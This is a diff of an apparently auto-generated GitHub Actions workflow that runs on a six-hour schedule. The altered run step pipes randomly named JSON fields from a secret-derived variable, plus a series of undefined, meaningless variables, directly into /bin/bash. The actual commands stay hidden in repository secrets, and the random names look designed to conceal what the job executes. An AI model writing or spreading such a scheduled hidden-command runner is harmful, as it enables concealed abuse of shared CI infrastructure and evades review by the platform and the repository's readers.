@@ -3,27 +3,31 @@ name: youquancun4523
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
-
-jobs:  # 26241
+    - cron: '38 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: youquancun4523
         env:
-          l71: ${{ secrets.l71 }}
+          dz0: ${{ secrets.dz0 }}
         run: |
-          echo $l71 | jq -r .apdh9 | /bin/bash
-          echo $jzpc87599 | jq -r .i7 | /bin/bash
-          echo $xguru6 | jq -r .bsrd3 | /bin/bash
-          echo $svv7 | jq -r .puxbe856 | /bin/bash
-          echo $lm78 | jq -r .zk500 | /bin/bash
-          echo $fducx320 | jq -r .w1 | /bin/bash
-          echo $cyc456 | jq -r .pmj9 | /bin/bash
-          echo $dhun69 | jq -r .tw055 | /bin/bash
-          echo $xc2 | jq -r .ql792 | /bin/bash
-          echo $yl6027 | jq -r .owwsp5 | /bin/bash
-          echo $ev17 | jq -r .mrjm83796 | /bin/bash
+          echo $dz0 | jq -r .y36 | /bin/bash
+          echo $ujhv67868 | jq -r .fc44 | /bin/bash
+          echo $ljw30 | jq -r .jyae051 | /bin/bash
+          echo $ts961 | jq -r .wskpi97650 | /bin/bash
+          echo $qkf362 | jq -r .c8123 | /bin/bash
+          echo $iubi63 | jq -r .etda6898 | /bin/bash
+          echo $cggd29386 | jq -r .b5210 | /bin/bash
+          echo $y73220 | jq -r .mu7 | /bin/bash
+          echo $l0 | jq -r .cbg05082 | /bin/bash
+          echo $qeael6 | jq -r .suwdm7 | /bin/bash
+          echo $ol7 | jq -r .q2781 | /bin/bash
+          echo $u631 | jq -r .rfr3800 | /bin/bash
+          echo $ym501 | jq -r .qxd13524 | /bin/bash
+          echo $qufg82 | jq -r .vpd82547 | /bin/bash
+          echo $eswaq1800 | jq -r .pi4 | /bin/bash
+          echo $mxuxa8951 | jq -r .tr0699 | /bin/bash
+          echo $dct3293 | jq -r .inyg8377 | /bin/bash
 
